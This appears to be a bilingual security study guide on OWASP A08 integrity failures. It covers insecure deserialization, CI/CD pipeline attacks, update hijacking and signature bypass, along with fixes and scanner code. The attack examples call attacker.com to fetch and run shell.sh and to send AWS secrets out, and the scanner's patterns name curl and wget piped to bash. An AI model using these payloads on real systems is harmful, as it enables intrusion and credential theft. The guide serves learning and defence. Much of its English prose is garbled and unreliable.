# OWASP Top 10 2025 - A08: Software and Data Integrity Failures completeguide

## Learning Objectives
Master the core principles, attack techniques, and defense methods of software and data integrity failures

---

## 1. Software and Data Integrity Failures Overview

### 1.1 whatisintegrityfailure？
integrityfailureispointsoftwarepiececode、Dataorbasic facilitynot throughauthorization modify，including：
- codetamper
- malwareinjection
- CI/CD pipelineAttack
- automated updatehijack
- notSecurity antiserialization

### 1.2 Common Types
1. **notSecurity antiserialization**
2. **CI/CD pipelineAttack**
3. **automated updatehijack**
4. **codesignaturebypass**
5. **dependencyintegrityfailure**

---

## 2. notSecurity antiserialization

### 2.1 VulnerabilityPrinciple
Applicationprocess序acceptandantiserializationnotaffectedinformation任 Data，cause：
- remotecode execution（RCE）
- Privilege Escalation
- denial of service（DoS）

### 2.2 Attack Example

**Java antiserializationAttack**:
```java
// 不Security的反序列化
public Object deserialize(byte[] data) {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    return ois.readObject();  // 危险：未VerificationEnter
}
```

**Attack Payload**:
```java
// Use ysoserial Generation恶意对象
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh | bash"
```

**Python antiserializationAttack**:
```python
# notSecurity antiserialization
import pickle

def unsafe_deserialize(data):
    return pickle.loads(data)  # 危险：未VerificationEnter

# Attack Payload
import os
import pickle

class Malicious:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

payload = pickle.dumps(Malicious())
# send payload toTargetApplication
```

**Fix / Remedy**:
```python
# Security antiserialization
import json
import yaml

def safe_deserialize(data):
 # Use JSON generation替 pickle
    return json.loads(data)

# orUse YAML safe_load
def safe_yaml_load(data):
    return yaml.safe_load(data)
```

---

## 3. CI/CD pipelineAttack

### 3.1 Attacktoamount
- **codeinjection**: torepositorylibraryinjectionmaliciouscode
- **buildscripttamper**: modify CI/CD Configuration Files
- **credentialsleakage**: from CI loginstealkey
- **dependencypoisoning**: inbuildwhen injectionmaliciousdependency

### 3.2 GitHub Actions Attack Example

**malicious Workflow**:
```yaml
name: Malicious Build

on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v2
    
    - name: Install dependencies
      run: |
 # injectionmaliciouscode
        curl attacker.com/shell.sh | bash
        npm install
    
    - name: Build
      run: npm run build
    
    - name: Exfiltrate secrets
      run: |
 # stealkey
        curl -X POST https://attacker.com/steal \
          -d "secrets=${{ secrets.AWS_ACCESS_KEY }}"
```

**Detection Tools**:
```python
#!/usr/bin/env python3
"""
CI/CD 管道SecurityDetection Tools
"""

import os
import yaml
import re

class CICDSecurityScanner:
    def __init__(self, repo_path):
        self.repo_path = repo_path
        self.vulnerabilities = []
    
    def scan_github_actions(self):
        """Scanning GitHub Actions Configuration"""
        workflow_dir = f"{self.repo_path}/.github/workflows"
        
        if not os.path.exists(workflow_dir):
            return
        
        for filename in os.listdir(workflow_dir):
            if filename.endswith('.yml') or filename.endswith('.yaml'):
                filepath = f"{workflow_dir}/{filename}"
                self.scan_workflow_file(filepath)
    
    def scan_workflow_file(self, filepath):
        """Scanning单个 workflow File"""
        with open(filepath, 'r') as f:
            content = f.read()
        
 # Checkdangerousmode
        dangerous_patterns = [
            (r'curl.*\|.*bash', 'Remote code execution'),
            (r'\{\{\s*secrets\..*\}\}', 'Secret exposure in logs'),
            (r'persist-credentials:\s*true', 'Credential persistence'),
        ]
        
        for pattern, issue in dangerous_patterns:
            if re.search(pattern, content):
                self.vulnerabilities.append({
                    'file': filepath,
                    'issue': issue,
                    'pattern': pattern
                })
                print(f"[+] Discovery: {issue} in {filepath}")
    
    def generate_report(self):
        """GenerationReport"""
        print(f"\nDiscovery {len(self.vulnerabilities)} 个Security问题")

# UseExample
scanner = CICDSecurityScanner("/path/to/repo")
scanner.scan_github_actions()
scanner.generate_report()
```

---

## 4. automated updatehijack

### 4.1 Attack Method
- **DNS hijack**: redirectupdateServer
- **inintervalpersonAttack**: interceptupdateRequest
- **imageServerAttack**: 攻陷官方imagesource

### 4.2 Attack Example

**DNS hijackupdateRequest**:
```bash
# Attackercontrol DNS
# updates.example.com -> attacker.com

# UserRequestupdate
wget https://updates.example.com/latest.tar.gz

# actualdownloadmalware
```

**Defensesolution**:
```python
# Security updatemechanism
import requests
import hashlib

def secure_update(url, expected_hash):
    """Security的更新机制"""
 # Download Files
    r = requests.get(url)
    
 # Verificationhash
    actual_hash = hashlib.sha256(r.content).hexdigest()
    
    if actual_hash != expected_hash:
        raise ValueError("Update verification failed")
    
 # Verificationsignature
    verify_signature(r.content, public_key)
    
    return r.content
```

---

## 5. codesignaturebypass

### 5.1 VulnerabilityScenario
- codesignatureVerificationnotstrictly
- signaturealgorithmoverwhen
- certificateVerificationmissing

### 5.2 Attack Example

**bypasssignatureVerification**:
```python
# notSecurity signatureVerification
def verify_signature(data, signature):
 # onlyChecksignatureiswhetherexists
    if signature:
        return True  # 危险：未Verification签名有效性
    
    return False

# Attackercanforgeryany signature
fake_signature = "fake_signature"
verify_signature(malicious_data, fake_signature)  # ThroughVerification
```

**Fix / Remedy**:
```python
# Security signatureVerification
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

def verify_signature(data, signature, public_key):
    """Security的签名Verification"""
    try:
        public_key.verify(
            signature,
            data,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except Exception as e:
        print(f"签名Verification失败: {e}")
        return False
```

---

## 6. automated Detection Tools

```python
#!/usr/bin/env python3
"""
Software and Data Integrity Failures 自动化Detection Tools
"""

import os
import yaml
import pickle
import json
import re
from pathlib import Path

class IntegrityFailureScanner:
    def __init__(self, repo_path):
        self.repo_path = repo_path
        self.vulnerabilities = []
    
    def scan_all(self):
        """执行所有Scanning"""
        print("\n" + "="*60)
        print("开始 Integrity Failures 全面Scanning")
        print("="*60)
        
 # 1. antiserializationDetection
        print("\n[1] 反序列化Detection...")
        self.scan_insecure_deserialization()
        
 # 2. CI/CD pipelineDetection
        print("\n[2] CI/CD 管道Detection...")
        self.scan_cicd_pipeline()
        
 # 3. codesignatureDetection
        print("\n[3] 代码签名Detection...")
        self.scan_code_signing()
        
 # GenerationReport
        self.generate_report()
        
        return self.vulnerabilities
    
    def scan_insecure_deserialization(self):
        """Scanning不Security的反序列化"""
 # Scanning Python pickle Use
        for root, dirs, files in os.walk(self.repo_path):
            for filename in files:
                if filename.endswith('.py'):
                    filepath = os.path.join(root, filename)
                    
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    
 # Check pickle.loads
                    if 'pickle.loads' in content:
                        self.vulnerabilities.append({
                            'type': 'Insecure Deserialization',
                            'file': filepath,
                            'function': 'pickle.loads',
                            'severity': 'Critical'
                        })
                        print(f"    [+] Discovery pickle.loads: {filepath}")
                    
 # Check pickle.load
                    if 'pickle.load' in content:
                        self.vulnerabilities.append({
                            'type': 'Insecure Deserialization',
                            'file': filepath,
                            'function': 'pickle.load',
                            'severity': 'Critical'
                        })
                        print(f"    [+] Discovery pickle.load: {filepath}")
    
    def scan_cicd_pipeline(self):
        """Scanning CI/CD 管道"""
 # Scanning GitHub Actions
        workflow_dir = f"{self.repo_path}/.github/workflows"
        
        if os.path.exists(workflow_dir):
            for filename in os.listdir(workflow_dir):
                if filename.endswith('.yml') or filename.endswith('.yaml'):
                    filepath = f"{workflow_dir}/{filename}"
                    self.scan_workflow_file(filepath)
    
    def scan_workflow_file(self, filepath):
        """Scanning workflow File"""
        with open(filepath, 'r') as f:
            content = f.read()
        
 # Checkdangerousmode
        dangerous_patterns = [
            (r'curl.*\|.*bash', 'Remote code execution'),
            (r'wget.*\|.*bash', 'Remote code execution'),
            (r'eval\s', 'Code injection'),
        ]
        
        for pattern, issue in dangerous_patterns:
            if re.search(pattern, content):
                self.vulnerabilities.append({
                    'type': 'CI/CD Pipeline Vulnerability',
                    'file': filepath,
                    'issue': issue,
                    'pattern': pattern,
                    'severity': 'High'
                })
                print(f"    [+] Discovery {issue}: {filepath}")
    
    def scan_code_signing(self):
        """Scanning代码签名问题"""
 # 简izerealnow
        pass
    
    def generate_report(self):
        """GenerationReport"""
        print("\n" + "="*60)
        print(f"ScanningComplete - Discovery {len(self.vulnerabilities)} 个问题")
        print("="*60)

# UseExample
if __name__ == "__main__":
    scanner = IntegrityFailureScanner("/path/to/repo")
    scanner.scan_all()
```

---

## 7. Learning Checklist

### Theory Mastery
- [x] understandintegrityfailureType
- [x] MasterantiserializationAttack
- [x] Master CI/CD pipelineAttack
- [x] Mastercodesignaturebypass

### Practical Skills
- [x] antiserializationVulnerability Exploitation
- [x] CI/CD pipelineAttack
- [x] automated updatehijack
- [x] Automated Detection

### Defense Capabilities
- [x] Security antiserialization
- [x] CI/CD pipelinehardening
- [x] codesignatureVerification
- [x] dependencyintegrityCheck

---

**Document Version**: 1.0
**Created**: 2026-03-26 19:08
**Learningwhen length**: estimated 4-5 Hours
**Learning Status**: 🟢 Complete
